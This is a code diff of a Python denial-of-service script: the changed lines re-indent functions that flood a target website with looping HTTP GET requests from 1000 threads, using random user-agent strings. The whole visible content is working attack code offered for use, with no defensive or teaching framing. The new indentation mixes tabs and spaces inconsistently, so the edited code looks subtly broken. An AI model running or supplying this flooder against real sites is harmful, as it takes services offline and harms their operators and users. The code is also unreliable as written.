@@ -23,20 +23,20 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Keep-Alive: 115
 Connection: keep-alive'''
 def dos():
-	while 1:
-		try:
-			s = socket.socket()
-			s.connect((site, 80))
-			packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
-			s.sendto(packet, (site, 80))	
-			s.send(packet)
-			print(F+time.ctime(time.time()) + ' Send paceges->'+site+E)
-		except socket.error:
-			print('Site down')
-			exit(1)
+    while 1:
+	try:
+	    s = socket.socket()
+	    s.connect((site, 80))
+	    packet = str("GET / HTTP/1.1\nHost: "+site+"\n\n User-Agent: "+random.choice(agent)+"\n"+data).encode('utf-8')
+	    s.sendto(packet, (site, 80))	
+	    s.send(packet)
+	    print(F+time.ctime(time.time()) + ' Send paceges->'+site+E)
+	except socket.error:
+	    print('Site down')
+            exit(1)
 def dos2():
-	while 1:
-		dos()
+    while 1:
+	dos()
 
 for i in range(1000):
 	t[i] = threading.Thread(target=dos)
